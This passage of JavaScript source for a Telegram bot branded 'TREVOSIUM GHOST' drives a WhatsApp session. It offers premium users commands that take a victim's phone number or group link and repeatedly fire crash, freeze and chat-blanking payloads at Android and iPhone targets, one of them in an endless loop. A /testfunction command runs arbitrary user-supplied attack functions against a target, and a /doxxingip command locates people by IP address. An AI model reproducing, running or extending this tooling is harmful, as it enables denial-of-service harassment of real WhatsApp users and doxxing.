        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await killeruimsg(sock, target);
    await sleep(9500);
    await CrashUI(sock, target);
    await sleep(9500);
    await BlankNotiffButton(sock, target);
    await sleep(9500);
    await UiZenifer(sock, target);
    await sleep(9500);
    await ATRUi(sock, target);
    await sleep(9500);
    await xCNFSCREENATK(sock, target);
    await sleep(55500);
    }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Crash Ui Android 
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
});

bot.command("ioskill", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.ioskill) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /ioskill 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Forclose Invisible iPhone
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await IPhoneForce(sock, target);
    await sleep(7580);
    await exoticsIPV2(sock, target);
    await sleep(55500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Forclose Invisible iPhone
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
}); 

bot.command("avicix", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.avicix) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /avicix 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Forclose Click Android
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 2; i++) {
    await fcInvis(sock, target);
    await sleep(55500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Forclose Click Android 
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
}); 

bot.command("overdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.overdocu) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /overdocu 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Blank Chat Documents
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await BorsOvas(sock, target);
    await sleep(8500);
    await otaxnewdocu2(sock, target);
    await sleep(8500);
    await OctarineBlanks(sock, target);
    await sleep(55500);
    }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Blank Chat Documents 
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
}); 

bot.command("filixer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.filixer) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /filixer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Forclose Infinity Invisible
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 120; i++) {
    await makanmalam(sock, target);
    await sleep(55500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Forclose Infinity Invisible 
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
}); 

bot.command("voxtrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.voxtrash) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /voxtrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Delay Blank Chat Visible
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await eventFlowres(target);
    await sleep(7500);
    await KayzenIsHereGajelasLu(sock, target);
    await sleep(7500);
    await RvXDelayui(sock, target);
    await sleep(7500);
    await VnXDelayContactNew(sock, target);
    await sleep(7500);
    await DelayVisible(sock, target)
    await sleep(55500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Delay Blank Chat Visible 
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
}); 

bot.command("blankios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  
  if (!commandStatus.blankios) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
  if (!q) return ctx.reply(`🪧 ☇ Format: /blankios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const datenow = new Date().toLocaleString("id-ID", {
  timeZone: "Asia/Jakarta",
  day: "2-digit",
  month: "2-digit",
  year: "numeric",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit"
});

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Blank Chat iPhone
│✘ Date: ${datenow}
│✘ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
╰───────────────────────═⬡</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await iosProduct2(target);
    await sleep(7500);
    await xCursedDelayIos(target);
    await sleep(55500);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<blockquote>╭═─═―⊱ ⎧ <b>TREVOSIUM GHOST</b> ⎭ ⊰―─═⬡
│✘ Target: ${q}
│✘ Type: Blank Chat iPhone
│✘ Date: ${datenow}
│✘ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
╰───────────────────────═⬡</blockquote>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}`, style: "success" }
        ]]
      }
    }
  );
}); 

bot.command('xflower', checkWhatsAppConnection, checkPremium, async (ctx) => {
    if (systemLocked) {
        return ctx.reply("🚫 Sytem Stopped.");
    }

    if (!checkGroupOnly(ctx)) return;

    const q = ctx.message.text.split(" ")[1];
    
    if (!commandStatus.xflower) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }

    if (!q) {
        return ctx.reply(
            "📋 Format: <code>/xflower 62×××</code>",
            { parse_mode: "HTML" }
        );
    }

    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await ctx.reply(
`✅ Forclose (Bug) Successfully Sent To <code>${q}</code>`,
        {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[
                    { text: "⌜📱⌟ ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }
                ]]
            }
        });

        const runAttack = async () => {
            try {
                while (true) {
                    await TrdxtCountV3(24, target);
                    await sleep(15500);
                }
            } catch (err) {
                console.error("Error:", err);
            }
        };

        runAttack();

    } catch (error) {
        console.error(error);
        ctx.reply("❌ error.");
    }
});
 
bot.command(
  "group",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    try {
      const chatId = ctx.chat.id;
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

      if (!checkGroupOnly(ctx)) return;

      const q = ctx.message.text.split(" ").slice(1).join(" ").trim();
      
      if (!commandStatus.group) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }

      if (!q) {
        return ctx.reply(
          "🚫 Masukin link grup yang bener!\nContoh:\n/group https://chat.whatsapp.com/XXXX"
        );
      }

      const codeMatch = q.match(/^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
      if (!codeMatch) {
        return ctx.reply(
          "🚫 Link grup salah!\nContoh:\n/group https://chat.whatsapp.com/XXXX"
        );
      }

      const groupCode = codeMatch[1];

      const sent = await ctx.telegram.sendPhoto(
        chatId,
        "https://files.catbox.moe/vsrzdw.jpg",
        {
          caption: `
<blockquote>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Group : <code>${q}</code>
⌑ Type   : Join Group
⌑ Status : Processing...
╘═—————————————————═⬡</blockquote>
          `,
          parse_mode: "HTML"
        }
      );

      const messageId = sent.message_id;

      await new Promise(resolve => setTimeout(resolve, 4000));

      let groupJid;

      try {
        groupJid = await sock.groupAcceptInvite(groupCode);
      } catch (err) {
      
        try {
          const inviteInfo = await sock.groupGetInviteInfo(groupCode);
          const metadata = await sock.groupMetadata(inviteInfo.id);

          if (metadata) {
            await ctx.telegram.editMessageCaption(
              chatId,
              messageId,
              undefined,
              `
<blockquote>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Group : <code>${q}</code>
⌑ Type   : Join Group
⌑ Status : Already Joined
╘═—————————————————═⬡</blockquote>
              `,
              { parse_mode: "HTML" }
            );
            return;
          }
        } catch {}

        await ctx.telegram.editMessageCaption(
          chatId,
          messageId,
          undefined,
          `
<blockquote>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Group : <code>${q}</code>
⌑ Type   : Join Group
⌑ Status : Failed
╘═—————————————————═⬡</blockquote>
          `,
          { parse_mode: "HTML" }
        );

        return;
      }

      if (!groupJid) {
        await ctx.telegram.editMessageCaption(
          chatId,
          messageId,
          undefined,
          `
<blockquote>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Group : <code>${q}</code>
⌑ Type   : Join Group
⌑ Status : Failed
╘═—————————————————═⬡</blockquote>
          `,
          { parse_mode: "HTML" }
        );
        return;
      }

      const groupMetadata = await sock.groupMetadata(groupJid).catch(() => null);

      if (!groupMetadata) {
        await ctx.telegram.editMessageCaption(
          chatId,
          messageId,
          undefined,
          `
<blockquote>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Group : <code>${q}</code>
⌑ Type   : Join Group
⌑ Status : Menunggu Persetujuan...
╘═—————————————————═⬡</blockquote>
          `,
          { parse_mode: "HTML" }
        );
        return;
      }

      await ctx.telegram.editMessageCaption(
        chatId,
        messageId,
        undefined,
        `
<blockquote>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡
⌑ Group : <code>${q}</code>
⌑ Type   : Join Group
⌑ Status : Successfully
╘═—————————————————═⬡</blockquote>
        `,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⌜チェックグループ⌟", url: q }
            ]]
          }
        }
      );

    } catch (err) {
      console.error(err);
      return ctx.reply("❌ Terjadi kesalahan sistem.");
    }
  }
);

bot.command("killgroup", async (ctx) => {
  try {
   const chatId = ctx.chat.id;
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }
    
    if (!checkGroupOnly(ctx)) return;

    const args = ctx.message.text.split(" ").slice(1);
    
    if (!commandStatus.killgroup) {
    return ctx.reply("⚠️ Command ini belum diaktifkan\n Pakai /enablecmd untuk mengaktifkan");
  }
  
    if (args.length < 1) {
      return ctx.reply(
        "🪧 Format salah!\n\n/killgroup <link_grup>\n\nContoh:\n/crashgroup https://chat.whatsapp.com/xxxxxx"
      );
    }

    const datenow = new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit"
    });

    const groupLink = args[0].trim();

    const codeMatch = groupLink.match(
      /^https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/
    );

    if (!codeMatch) {
      return ctx.reply("❌ Link WhatsApp group tidak valid.");
    }

    const inviteCode = codeMatch[1];

    await ctx.reply("🔍 Mengecek status group...");

    const inviteInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
    if (!inviteInfo?.id) {
      return ctx.reply("❌ Gagal mendapatkan info group.");
    }

    const groupJid = inviteInfo.id;

    const metadata = await sock.groupMetadata(groupJid).catch(() => null);
    if (!metadata) {
      return ctx.reply(
        "⚠️ Sender belum join ke group.\n\nGunakan command:\n/group " +
          groupLink
      );
    }

    const detectMsg = await ctx.reply("✅ Sender sudah berada di group");

    await new Promise(res => setTimeout(res, 1500));
    await ctx.telegram.deleteMessage(ctx.chat.id, detectMsg.message_id);

    const startMsg = await ctx.reply(
      `<pre>⬡═—⊱「 TREVOSIUM GHOST 」⊰—═⬡
∙▹ Group : <code>${groupLink}</code>
∙▹ Type : Freeze Click Group
∙▹ Status : Processing...
∙▹ Date: ${datenow}</pre>`,
      { parse_mode: "HTML" }
    );

    const sleep = (ms) => new Promise(res => setTimeout(res, ms));

    for (let i = 0; i < 3; i++) {
      await FriendNewsLaster(sock, groupJid);
      await sleep(1550);
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      startMsg.message_id,
      null,
      `<pre>⬡═—⊱「 TREVOSIUM GHOST 」⊰—═⬡
∙▹ Group : <code>${groupLink}</code>
∙▹ Type : Freeze Click Group
∙▹ Status : Successfully
∙▹ Date: ${datenow}</pre>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜チェックグループ⌟", url: groupLink }
          ]]
        }
      }
    );

  } catch (err) {
    console.error("Error:", err);
    ctx.reply("❌ Terjadi kesalahan sistem.");
  }
});

bot.command(
  'testfunction',
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async (ctx) => {
    const chatId = ctx.chat.id;
    const userId = ctx.from.id;
    const args = ctx.message.text.trim().split(" ");
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }

    if (args.length < 3)
      return ctx.reply(
        "🪧 ☇ Format: /testfunction 62××× 10 (reply function)"
      );

    const q = args[1];
    const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0)
      return ctx.reply("❌ ☇ Jumlah harus angka");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
      return ctx.reply("❌ ☇ Reply dengan function JavaScript");

    const thumbnailUrl = "https://files.catbox.moe/cu91z7.jpg";

    const captionStart = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡</pre></blockquote>
⌑ Target
╰❁ ${q}

⌑ Type
╰❁ Unknown Function

⌑ Status
╰❁ Process...
`;

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
      caption: captionStart,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
        ],
      },
    });

    const safeSock = createSafeSock(sock);
    const funcCode = ctx.message.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) return ctx.reply("❌ ☇ Function tidak valid");

    const funcName = matchFunc[1];
    const wrapper = `${funcCode}\n${funcName}`;

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) await fn(target);
        else if (arity === 2) await fn(safeSock, target);
        else await fn(safeSock, target, true);
      } catch (err) {}
      await sleep(200);
    }

    const captionFinal = `
<blockquote><pre>⬡═—⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰—═⬡</pre></blockquote>
⌑ Target
╰❁ ${q}

⌑ Type
╰❁ Unknown Function

⌑ Status
╰❁ ✅ Success
`;

    try {
      await ctx.editMessageCaption(captionFinal, {
        chat_id: chatId,
        message_id: processMsg.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ],
        },
      });
    } catch (e) {
      await ctx.replyWithPhoto(thumbnailUrl, {
        caption: captionFinal,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }]
          ],
        },
      });
    }
  }
);

///=======( TOOLS AREA )=======\\\

bot.command("tiktokdl", async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }
const args = ctx.message.text.split(/\s+/).slice(1).join(' '); if (!args) return ctx.reply('🪧 ☇ Format: /tiktokdl https://example.com/');

let url = args; if (ctx.message.entities) { for (const e of ctx.message.entities) { if (e.type === 'url') { url = ctx.message.text.substring(e.offset, e.offset + e.length); break; } } }

const wait = await ctx.reply('⌛ ☇ Tunggu sebentar...');

try { const { data } = await axios.get('https://tikwm.com/api/', { params: { url }, headers: { 'user-agent': 'Mozilla/5.0', accept: 'application/json' }, timeout: 20000 });

if (!data || data.code !== 0 || !data.data) return ctx.reply('❌ ☇ Gagal ambil data video');

const d = data.data;

if (Array.isArray(d.images) && d.images.length) {
  const imgs = d.images.slice(0, 10);
  for (const img of imgs) {
    const res = await axios.get(img, { responseType: 'arraybuffer' });
    await ctx.replyWithPhoto({ source: Buffer.from(res.data) });
  }
  return;
}

const videoUrl = d.play || d.hdplay || d.wmplay;
if (!videoUrl) return ctx.reply('❌ ☇ Tidak ada link video');

const video = await axios.get(videoUrl, { responseType: 'arraybuffer' });
await ctx.replyWithVideo({ source: Buffer.from(video.data) });

} catch { await ctx.reply('❌ ☇ Error mengunduh video'); }

try { await ctx.deleteMessage(wait.message_id); } catch {} });

bot.command('doxxingip', async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const ip = ctx.message.text.split(' ')[1]?.trim();

  if (!ip) {
    return ctx.reply("❌ ☇ Format: /doxxingip <IP>");
  }

  const userPremium = premiumUsers.find(u => u.id === userId);
  if (!userPremium || new Date(userPremium.expiresAt) < new Date()) {
    return ctx.reply("❌ ☇ Kamu bukan user Premium!");
  }

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(
      p => /^\d{1,3}$/.test(p) && !(p.length > 1 && p.startsWith("0")) && +p >= 0 && +p <= 255
    );
  }

  function isValidIPv6(ip) {
    const r = /^(([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(([0-9A-Fa-f]{1,4}:){1,7}:)|(::([0-9A-Fa-f]{1,4}:){0,6}[0-9A-Fa-f]{1,4}))$/;
    return r.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply(
      "❌ ☇ IP tidak valid. Masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar."
    );
  }

  const processingMsg = await ctx.reply(
    `🔎 ☇ Tracking IP ${ip} sedang diproses...`
  );

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, {
      timeout: 10000
    });
    const data = res.data;

    if (!data || data.success === false) {
      return ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "-";
    const lon = data.longitude || "-";
    const mapsUrl =
      lat !== "-" && lon !== "-"
        ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + "," + lon)}`
        : null;

    const caption = `
<blockquote><pre>⬡⊱ ⎧ TREVOSIUM GHOST ⎭ ⊰⬡</pre></blockquote>
⌑ IP
╰❁ ${data.ip || "-"}

⌑ Country
╰❁ ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}

⌑ Region
╰❁ ${data.region || "-"}

⌑ City
╰❁ ${data.city || "-"}

⌑ ZIP
╰❁ ${data.postal || "-"}

⌑ Timezone
╰❁ ${data.timezone_gmt || "-"}

⌑ ISP
╰❁ ${data.isp || "-"}

⌑ Org
╰❁ ${data.org || "-"}

⌑ ASN
╰❁ ${data.asn || "-"}

⌑ Lat/Lon
╰❁ ${lat}, ${lon}
${mapsUrl ? `📍 ☇ <a href="${mapsUrl}">Buka di Maps</a>` : ""}
`;

    await ctx.reply(caption, {
      parse_mode: "HTML",
      disable_web_page_preview: false
    });
  } catch (err) {
    await ctx.reply(
      "❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti."
    );
  } finally {
    try {
      await ctx.deleteMessage(processingMsg.message_id);
    } catch {}
  }
});

bot.command("anime", async (ctx) => {
    if (systemLocked) {
    return ctx.reply("🚫 Sytem Stopped.");
    }
  const chatId = ctx.chat.id;
  const text = ctx.message.text || "";
  const query = text.replace(/^\/anime\s*/i, "").trim();

  if (!query) {
    return ctx.reply(
